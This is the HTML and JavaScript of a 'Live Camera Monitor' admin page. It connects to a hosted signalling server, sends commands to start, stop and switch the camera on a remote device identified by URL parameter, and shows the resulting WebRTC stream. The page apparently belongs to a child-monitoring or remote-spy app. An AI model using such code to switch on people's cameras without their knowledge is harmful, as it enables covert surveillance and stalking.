<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Live Camera Monitor</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
/* --- 1. COLORS & VARIABLES --- */
:root{
    --bg: #121212;
    --panel: #1e1e1e;
    --green: #2ecc71;
    --red: #e74c3c;
    --blue: #3498db;
    --text: #ffffff;
}

/* --- 2. GLOBAL RESET --- */
body {
    margin: 0;
    padding: 0;
    background: var(--bg);
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    height: 100vh;
    height: 100dvh; /* Mobile browser address bar fix */
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* No scrollbars */
}

/* --- 3. APP CONTAINER (PHONE LOOK) --- */
.app {
    width: 100%;
    height: 100%;
    background: #000;
    display: flex;
    flex-direction: column;
    position: relative;
    overflow: hidden;
}

/* Laptop/Desktop Specific Styles */
@media (min-width: 501px) {
    .app {
        max-width: 400px;       /* Phone Width */
        height: 85vh;           /* Phone Height */
        max-height: 800px;
        border-radius: 25px;    /* Rounded Corners */
        box-shadow: 0 0 40px rgba(0,0,0,0.6); /* Shadow */
        border: 4px solid #333; /* Bezel */
    }
}

/* --- 4. HEADER --- */
.header {
    flex-shrink: 0; /* Header kabhi shrink nahi hoga */
    padding: 15px 20px;
    background: var(--panel);
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid rgba(255,255,255,0.1);
    z-index: 10;
}

.title {
    color: var(--text);
    font-weight: 600;
    font-size: 16px;
    letter-spacing: 0.5px;
}

.status {
    font-size: 11px;
    padding: 4px 10px;
    border-radius: 12px;
    background: rgba(231, 76, 60, 0.2);
    color: var(--red);
    font-weight: 700;
    text-transform: uppercase;
    border: 1px solid var(--red);
}

.status.live {
    background: rgba(46, 204, 113, 0.2);
    color: var(--green);
    border: 1px solid var(--green);
}

/* --- 5. VIDEO AREA (FLEXIBLE) --- */
.video-box {
    flex-grow: 1; /* Ye bachi hui sari jagah lega */
    background: #000;
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
}

video {
    width: 100%;
    height: 100%;
    object-fit: contain; /* Video kategi nahi, fit hogi */
}

/* --- 6. CONTROLS (FIXED BOTTOM) --- */
.controls {
    flex-shrink: 0; /* Buttons kabhi gayab nahi honge */
    padding: 20px;
    background: var(--panel);
    display: flex;
    gap: 15px;
    /* iPhone Home Bar Safe Area */
    padding-bottom: max(20px, env(safe-area-inset-bottom));
    border-top: 1px solid rgba(255,255,255,0.1);
}

.btn {
    border: none;
    border-radius: 12px;
    padding: 16px 0;
    font-size: 14px;
    font-weight: 600;
    color: white;
    cursor: pointer;
    transition: transform 0.1s ease, opacity 0.2s;
    display: flex;
    justify-content: center;
    align-items: center;
}

.btn:active {
    transform: scale(0.96);
    opacity: 0.8;
}

/* Button Colors */
.start {
    flex: 2; /* Start button bada */
    background: var(--green);
    color: #000;
    box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
}

.stop {
    flex: 2; /* Stop button bada */
    background: var(--red);
    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
}

.switch {
    flex: 1; /* Switch button chota */
    background: #333;
    font-size: 20px;
    color: var(--blue);
}

</style>
</head>

<body>

<div class="app">

    <div class="header">
        <span class="title">ðŸ“· Camera Monitor</span>
        <span id="status" class="status">OFFLINE</span>
    </div>

    <div class="video-box">
        <video id="remoteVideo" autoplay playsinline muted></video>
    </div>

    <div class="controls">
        <button class="btn start" onclick="startCamera()">Start</button>
        <button class="btn switch" onclick="switchCamera()">ðŸ”„</button>
        <button class="btn stop" onclick="stopCamera()">Stop</button>
    </div>

</div>

<script>
/* ================= CONFIG ================= */

const SERVER = "https://child-v9no.onrender.com";

const params = new URLSearchParams(window.location.search);
let DEVICE_ID = params.get("id");

if(!DEVICE_ID){
    DEVICE_ID = localStorage.getItem("savedDeviceId");
}

if(!DEVICE_ID){
    // Fallback taaki UI khali na lage agar ID na ho
    console.log("Device ID missing in URL or LocalStorage"); 
}

/* ================= WEBRTC ================= */

let socket;
let pc;

const config = {
    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
};

/* ================= SOCKET ================= */

socket = io(SERVER);

socket.on("connect", ()=>{
    console.log("Connected to Server");
    socket.emit("join-room","ADMIN");
});

/* ================= OFFER ================= */

socket.on("offer", async (data)=>{

    pc = new RTCPeerConnection(config);

    pc.ontrack = (event) => {
        const video = document.getElementById("remoteVideo");

        if (event.streams && event.streams[0]) {
            video.srcObject = event.streams[0];
        } else {
            const stream = new MediaStream();
            stream.addTrack(event.track);
            video.srcObject = stream;
        }

        video.play().catch(e => console.log("Autoplay error:", e));
        setStatus(true);
    };

    pc.onicecandidate = (e)=>{
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));

    const ans = await pc.createAnswer();
    await pc.setLocalDescription(ans);

    socket.emit("answer",{
        target: DEVICE_ID,
        sdp: ans.sdp
    });
});

/* ================= ICE ================= */

socket.on("candidate", async d=>{
    if(pc){
        await pc.addIceCandidate(new RTCIceCandidate({
            candidate: d.candidate,
            sdpMid: d.sdpMid,
            sdpMLineIndex: d.sdpMLineIndex
        }));
    }
});

/* ================= BUTTONS ================= */

function startCamera(){
    if(!DEVICE_ID) { alert("Device ID nahi mila! URL me ?id=YOUR_ID lagayein."); return; }
    
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "start_video"
    });
}

function stopCamera(){
    if(!DEVICE_ID) return;

    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command: "stop_video"
    });

    const v = document.getElementById("remoteVideo");
    v.srcObject = null;

    if(pc){
        pc.close();
        pc = null;
    }

    setStatus(false);
}

function switchCamera(){
    if(!DEVICE_ID) return;
    socket.emit("switch-camera",{ target: DEVICE_ID });
}

/* ================= UI HELPER ================= */

function setStatus(live){
    const s = document.getElementById("status");
    s.textContent = live ? "LIVE" : "OFFLINE";
    s.className = live ? "status live" : "status";
}
</script>

</body>
</html>
